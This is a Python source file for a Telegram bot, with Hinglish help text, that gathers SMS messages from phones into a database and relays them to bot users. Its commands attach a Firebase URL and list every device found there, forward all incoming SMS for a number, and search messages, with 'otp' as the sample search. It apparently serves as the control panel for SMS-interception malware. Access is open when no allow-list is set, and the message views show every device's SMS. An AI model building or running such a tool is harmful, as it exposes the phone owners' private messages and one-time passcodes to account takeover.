import logging
from datetime import datetime, timezone

from sqlalchemy.orm import Session
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

from app.config import get_settings
from app.database import Device, SMSMessage, SessionLocal
from app.services import (
    claim_device,
    device_status,
    get_monitoring_user_ids,
    list_devices_with_counts,
    register_device,
    get_monitor_profile,
    set_firebase_url,
    set_user_phone,
    start_monitoring,
    stop_monitoring,
)

logger = logging.getLogger(__name__)
settings = get_settings()


def is_authorized(user_id: int | None) -> bool:
    if user_id is None:
        return False
    allowed = settings.allowed_user_ids
    if not allowed:
        return True
    return user_id in allowed


def format_sms(sms: SMSMessage) -> str:
    received = sms.received_at.astimezone(timezone.utc).strftime("%d %b %Y, %H:%M UTC")
    return (
        f"📱 *Device:* `{sms.device_name}`\n"
        f"📞 *From:* `{sms.sender}`\n"
        f"🕐 *Time:* {received}\n"
        f"💬 *Message:*\n{sms.message}"
    )


def format_device_line(device: Device, sms_count: int) -> str:
    status = device_status(device)
    icon = {"online": "🟢", "idle": "🟡", "offline": "🔴", "inactive": "⚫"}.get(status, "⚪")
    last_seen = (
        device.last_seen.astimezone(timezone.utc).strftime("%d %b %H:%M")
        if device.last_seen
        else "Never"
    )
    source = " 🔥" if device.firebase_key else ""
    return f"{icon} `{device.name}`{source} — {sms_count} SMS | last: {last_seen}"


async def notify_new_sms(sms: SMSMessage) -> None:
    if not settings.telegram_bot_token:
        return

    db: Session = SessionLocal()
    try:
        monitoring_users = get_monitoring_user_ids(db, sms)
        if not monitoring_users and settings.allowed_user_ids:
            monitoring_users = settings.allowed_user_ids
    finally:
        db.close()

    if not monitoring_users:
        logger.warning("No active monitors; skipping notification")
        return

    from telegram import Bot

    bot = Bot(token=settings.telegram_bot_token)
    text = "🆕 *New SMS Received*\n\n" + format_sms(sms)

    for user_id in monitoring_users:
        try:
            await bot.send_message(chat_id=user_id, text=text, parse_mode="Markdown")
        except Exception as exc:
            logger.error("Failed to notify user %s: %s", user_id, exc)


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        await update.message.reply_text("❌ Unauthorized. Contact admin.")
        return

    await update.message.reply_text(
        "👋 *SMS Monitor Bot*\n\n"
        "Commands:\n"
        "/mynum <number> - Apna number set karo\n"
        "/startmonitar - SMS forwarding start\n"
        "/stopmonitar - SMS forwarding stop\n"
        "/setfirebase <url> - Firebase attach karo\n"
        "/a <deviceid> - Apni device add/claim karo\n"
        "/devices - Apni saari devices dekho\n"
        "/device <name> - Ek device ke SMS dekho\n"
        "/adddevice <name> - Nayi device add karo\n"
        "/recent - Last 10 SMS\n"
        "/search <keyword> - Search messages\n"
        "/stats - Total SMS count\n"
        "/help - Show help",
        parse_mode="Markdown",
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    await update.message.reply_text(
        "📖 *Help*\n\n"
        "Apna database `.env` mein `DATABASE_URL` se connect karo.\n"
        "Device SMS bhejti hai to automatically bot mein aa jati hai.\n\n"
        "*Monitor commands:*\n"
        "/mynum 9876543210 - Apna SIM number set karo\n"
        "/startmonitar - Is number ke saare SMS forward\n"
        "/stopmonitar - Forwarding band karo\n\n"
        "*Firebase:*\n"
        "/setfirebase https://project.firebaseio.com\n"
        "/devices - Firebase ki saari devices dikhegi\n\n"
        "*Device commands:*\n"
        "/a myphone - Apni device add/claim karo\n"
        "/devices - Meri devices list\n"
        "/device redmi - Us device ke recent SMS\n"
        "/adddevice samsung - Manual device add\n\n"
        "*SMS commands:*\n"
        "/recent - Last 10 SMS\n"
        "/search otp - OTP dhundho\n"
        "/stats - Statistics",
        parse_mode="Markdown",
    )


async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        await update.message.reply_text(
            "Usage: `/mynum <number>`\n\n"
            "Example:\n"
            "`/mynum 9876543210`\n"
            "`/mynum +919876543210`",
            parse_mode="Markdown",
        )
        return

    phone = context.args[0]
    db: Session = SessionLocal()
    try:
        profile, device = set_user_phone(db, user.id, phone)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    except PermissionError:
        await update.message.reply_text("❌ Ye number kisi aur user ka hai.")
        return
    finally:
        db.close()

    await update.message.reply_text(
        f"✅ Number set: `+{profile.phone_number}`\n"
        f"📱 Device: `{device.name}`\n"
        f"🔑 API key: `{device.api_key}`\n\n"
        f"Ab `/startmonitar` likho forwarding start karne ke liye.",
        parse_mode="Markdown",
    )


async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        profile = start_monitoring(db, user.id)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    await update.message.reply_text(
        f"🟢 *Monitoring Started!*\n\n"
        f"📞 Number: `+{profile.phone_number}`\n"
        f"📨 Ab is number par aane wale *saare incoming SMS* "
        f"yahan forward honge.\n\n"
        f"Phone par webhook setup karo ya superuser daemon chalao.",
        parse_mode="Markdown",
    )


async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        profile = stop_monitoring(db, user.id)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    await update.message.reply_text(
        f"🔴 Monitoring stopped for `+{profile.phone_number or 'unknown'}`",
        parse_mode="Markdown",
    )


async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        await update.message.reply_text(
            "Usage: `/setfirebase <firebase-url>`\n\n"
            "Example:\n"
            "`/setfirebase https://myapp.firebaseio.com`\n"
            "`/setfirebase https://myapp.firebaseio.com/devices`",
            parse_mode="Markdown",
        )
        return

    firebase_url = " ".join(context.args)
    db: Session = SessionLocal()
    try:
        profile, devices = await set_firebase_url(db, user.id, firebase_url)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    except Exception as exc:
        logger.error("Firebase sync failed: %s", exc)
        await update.message.reply_text(f"❌ Firebase error: {exc}")
        return
    finally:
        db.close()

    lines = [
        f"✅ *Firebase Attached!*\n",
        f"🔗 URL: `{profile.firebase_url}`",
        f"📱 Total devices: *{len(devices)}*\n",
    ]
    for device in devices[:30]:
        phone = f"+{device.phone_number}" if device.phone_number else "N/A"
        lines.append(f"🔥 `{device.name}` | {phone}")

    if len(devices) > 30:
        lines.append(f"\n... aur {len(devices) - 30} devices")

    lines.append("\n`/devices` se saari devices dekho.")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        await update.message.reply_text(
            "Usage: `/a <deviceid>`\n\n"
            "Example:\n"
            "`/a redmi-note-12`\n"
            "`/a 3`",
            parse_mode="Markdown",
        )
        return

    deviceid = context.args[0]
    db: Session = SessionLocal()
    try:
        device, created = claim_device(db, deviceid, user.id)
        sms_count = (
            db.query(SMSMessage)
            .filter(SMSMessage.device_id == device.id)
            .count()
        )
    except PermissionError:
        await update.message.reply_text("❌ Ye device kisi aur user ki hai.")
        return
    finally:
        db.close()

    status = device_status(device)
    status_icon = {"online": "🟢", "idle": "🟡", "offline": "🔴"}.get(status, "⚪")
    action = "added" if created else "linked"

    await update.message.reply_text(
        f"✅ Device {action}: `{device.name}`\n\n"
        f"🆔 ID: `{device.id}`\n"
        f"{status_icon} Status: *{status}*\n"
        f"📨 SMS count: *{sms_count}*\n"
        f"🔑 API key: `{device.api_key}`\n\n"
        f"Phone webhook mein ye key use karo.",
        parse_mode="Markdown",
    )


async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        profile = get_monitor_profile(db, user.id)
        items = list_devices_with_counts(db, owner_telegram_id=user.id)
    finally:
        db.close()

    if not items:
        await update.message.reply_text(
            "📭 Abhi tumhari koi device nahi hai.\n\n"
            "Firebase: `/setfirebase <url>`\n"
            "Manual: `/a my-phone`\n"
            "Ya SMS forward karo, phir `/a deviceid` se claim karo.",
            parse_mode="Markdown",
        )
        return

    header = "📱 *Meri Devices*"
    if profile and profile.firebase_url:
        header += f"\n🔥 Firebase: `{profile.firebase_url}`"
    lines = [header + "\n"]
    for item in items:
        lines.append(format_device_line(item["device"], item["sms_count"]))

    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def device_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("Usage: /device <device-name>")
        return

    device_name = " ".join(context.args)
    db: Session = SessionLocal()
    try:
        device = db.query(Device).filter(Device.name == device_name).first()
        if not device:
            await update.message.reply_text(
                f"❌ Device `{device_name}` nahi mili.\n/devices se list dekho.",
                parse_mode="Markdown",
            )
            return

        messages = (
            db.query(SMSMessage)
            .filter(SMSMessage.device_name == device_name)
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text(f"📭 `{device_name}` par abhi koi SMS nahi.", parse_mode="Markdown")
        return

    parts = [f"📱 *Device:* `{device_name}`\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


async def adddevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("Usage: /adddevice <device-name>")
        return

    device_name = " ".join(context.args)
    db: Session = SessionLocal()
    try:
        device = register_device(db, device_name)
        db.commit()
        db.refresh(device)
    finally:
        db.close()

    await update.message.reply_text(
        f"✅ Device added: `{device.name}`\n"
        f"🔑 Device API key: `{device.api_key}`\n\n"
        f"Phone par ye key use karo webhook mein.",
        parse_mode="Markdown",
    )


async def recent_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    db: Session = SessionLocal()
    try:
        messages = (
            db.query(SMSMessage)
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text("📭 No SMS messages yet.")
        return

    parts = ["📬 *Recent SMS (last 10)*\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("Usage: /search <keyword>")
        return

    keyword = " ".join(context.args).lower()
    db: Session = SessionLocal()
    try:
        messages = (
            db.query(SMSMessage)
            .filter(SMSMessage.message.ilike(f"%{keyword}%"))
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text(f"🔍 No messages found for: `{keyword}`", parse_mode="Markdown")
        return

    parts = [f"🔍 *Search results for:* `{keyword}`\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    db: Session = SessionLocal()
    try:
        total = db.query(SMSMessage).count()
        device_count = db.query(Device).count()
        latest = (
            db.query(SMSMessage)
            .order_by(SMSMessage.received_at.desc())
            .first()
        )
    finally:
        db.close()

    latest_text = "Never"
    if latest:
        latest_text = latest.received_at.astimezone(timezone.utc).strftime("%d %b %Y, %H:%M UTC")

    await update.message.reply_text(
        f"📊 *SMS Monitor Stats*\n\n"
        f"Total messages: *{total}*\n"
        f"Total devices: *{device_count}*\n"
        f"Last received: {latest_text}",
        parse_mode="Markdown",
    )


def build_telegram_app() -> Application | None:
    if not settings.telegram_bot_token:
        logger.warning("TELEGRAM_BOT_TOKEN not set; Telegram bot disabled")
        return None

    app = Application.builder().token(settings.telegram_bot_token).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("mynum", mynum_command))
    app.add_handler(CommandHandler("startmonitar", startmonitar_command))
    app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
    app.add_handler(CommandHandler("setfirebase", setfirebase_command))
    app.add_handler(CommandHandler("a", a_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("device", device_command))
    app.add_handler(CommandHandler("adddevice", adddevice_command))
    app.add_handler(CommandHandler("recent", recent_command))
    app.add_handler(CommandHandler("search", search_command))
    app.add_handler(CommandHandler("stats", stats_command))
    return app
